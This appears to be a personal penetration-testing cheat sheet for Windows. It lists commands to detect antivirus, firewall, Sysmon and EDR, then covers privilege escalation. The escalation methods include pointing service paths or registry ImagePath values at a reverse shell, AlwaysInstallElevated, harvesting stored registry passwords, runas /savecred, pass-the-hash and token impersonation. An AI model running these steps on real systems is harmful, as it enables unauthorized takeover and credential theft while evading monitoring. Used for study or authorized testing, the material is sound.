
# Enumerate implemented security Tools on the target

- **whether antivirus exists or not**
  ```ps1
  wmic /namespace:\\root\securitycenter2 path antivirusproduct
  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
  ```
  
- **check WindowsDefender**
  ```ps1
  Get-Service WinDefend
  Get-MpComputerStatus | select RealTimeProtectionEnabled
  ```
    
- **firewall**
  ```ps1
  Get-NetFirewallProfile | Format-Table Name, Enabled
    
  #set firewall disable
  Get-NetFirewallProfile | Format-Table Name, Enabled
  
  #check the current Firewall rules
  Get-NetFirewallRule | select DisplayName, Enabled, Description
  ```
    
    
- **get a list of available event logs on the local machine**     
  ```ps1
  # list of available event logs gives you an insight into what applications and services are installed
  Get-EventLog -List
  ```
  
- **SYSmon**
  ```ps1
  # installed or not
  Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
  Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational

  # try to find the sysmon configuration file if we have readable permission to understand system monitoring.
  findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
  ```
  
- **tools for check EDR on system**
  + [Invoke-EDRchecker](https://github.com/PwnDexter/Invoke-EDRChecker)
  + [SharpEDRchecker](https://github.com/PwnDexter/SharpEDRChecker)
    
    
    
# Enumerate Applications and Services

- **using wmic to list all installed applications**
  ```ps1
  wmic product get name,version, vendor  
  ```

- **services**
  ```ps1
  # list running services
  net start
  
  #We can see a service with the name <Service-name> which we want to know more about
  wmic service where "name like 'Service-name'" get Name,PathName
  
  # We find the file name and its path; now let's find more details using the Get-Process cmdlet
  Get-Process -Name Exe-demo
  
  # Once we find its process ID, let's check if providing a network service by listing the listening ports within the system.
  netstat -noa |findstr "LISTENING" |findstr "3212"
  ```
- **check updates**  
```ps1  
# You can check installed updates using
wmic qfe get Caption, Description
```  

- **check Shares**
```ps1
net share
```  

- **Get info from SNMP**
```ps1
snmpcheck.rb MACHINE_IP -c COMMUNITY_STRING
```  





# windows service Enumerations for privEsc: 
	
	NOTE: in most of the cases we only want to replace service binary with our reverse-shell.exe. so, we look for binary path in any way we can to do this
	NOTE: Download this Binary: accesschk.exe. this helps you better enumerate file and directory permissions on that system.
	NOTE: after replacing the service binary YOU SHOULD BE ABLE TO RESTART THE TARGET SERVICE

## Services

	1- first of all we can use this command to take a look at the service: 
		
		"cmd.exe /c sc qc <serviceName>"



	2- Insecure Service Permissions: try to set binpath in target service-configuration(note: changing binaryPath):
		
		+ sc config <serviceName> binpath=<Path-to-reverseShell>
		
		+ check for this ability: .\accesschk.exe /accepteula -uwcqv <username> <service-name>


	3- Unquoted path file: try to create reverse_shell filename similar to folder-names. in case that you have write permissions

		+ check if we can write to where we want: .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"



	4- Weak Registry Permissions:   			

		+ check if we can write to service's registry: .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<Service-name>

		+ overwrite binaryPath in registry: reg add HKLM\SYSTEM\CurrentControlSet\services\<Service-name> /v ImagePath /t REG_EXPAND_SZ /d <reverse-shell path> /f

					
	5- permission to write on actual service's executable file.

		+ check: .\accesschk.exe /accepteula -quvw "C:\Program Files\<path-to-executable-file-for-servcie>.exe"


## Registry


	1- AutoRun applications Registry: 

			NOTE: look for registry-key for autoRun applications. then find the executable location.

			+ the following registry-key tell the system to run this executable every time that user logs on: 
			
				+ Registry:  	HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
						HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
			+ Query: 
				+ reg query <Registry name>
					
			+ check permissions: .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"




	2- Always Install Elevated Registry:

		   NOTE: if the values for the following registries are '1', then a low privileged user can install programs with administrator privileges.

			+ Registry: 	HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
					HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer			
		
		+ Query: 
			+ reg query <Registry name> /v AlwaysInstallElevated



	3- Stored password in Registry:

		NOTE: navigate to HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon and scroll down to "DefaultPassword." When you double-click on that, a window should pop up that reveals the stored password

			+ Registry: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

		+ Query: 
			+ reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
			+ reg query HKLM /f password /t REG_SZ /s


## scheduled tasks:
	+ needless to say that if you have permissions to change the contents of the scheduled scripts that are running with administration privileges, you can gain a reverse shell.


## StartUp Applications: 

	+ StartUP Application: check if you have permission to put any shortcuts at the following path. if you have, so you can put your shell code to be executed by the system at startUP.

		Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

		Note: be aware that there is a another startup foder for a specific user in the following. dont put your shell in here. its useless:
			+ C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.

		Check: .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"


		win + ctl and open run: 
			goto this users's startup folder: "shell:startup"
			goto AllUsers's startup folder: "shell:common startup



## unsecure GUI with system priv:
	+ if any GUI application running with admin rights, has "file open" option, we can spawn cmd.exe as admin.



## stored passwords:

	+ 1 stored credentilas from another users (maybe admin):

		NOTE: make sure you updated the stored credentials, otherwise you will see nothing by this command.
		+ Enumerate stored Credentials: cmdkey /list


		NOTE: Allows a user to run specific tools and programs with different permissions than the user's current logon provides.
		+ command: runas /savecred /user:admin C:\<path-to-binaryFile>.exe



	+ 2 Stealing SAM database: maybe there is a SAM backup


	+ 3 PASS THE HASH: to run binaries with pass the hash you need to run: pth-winexe -U 'admin%NTLM-hash' //<target local-IP> cmd.exe
  
  
  
## Token Impersonation:

	+ fairly hard to Describe :)))))
	- 1 check if you have this specific token: 
		command: whoami /priv
		Note: you should look for : SeImpersonatePrivilege
	- 2 use this tools to gain "NT Authority/System" shell:
		+ Rugue potato 
		+ prinSpoofer
  





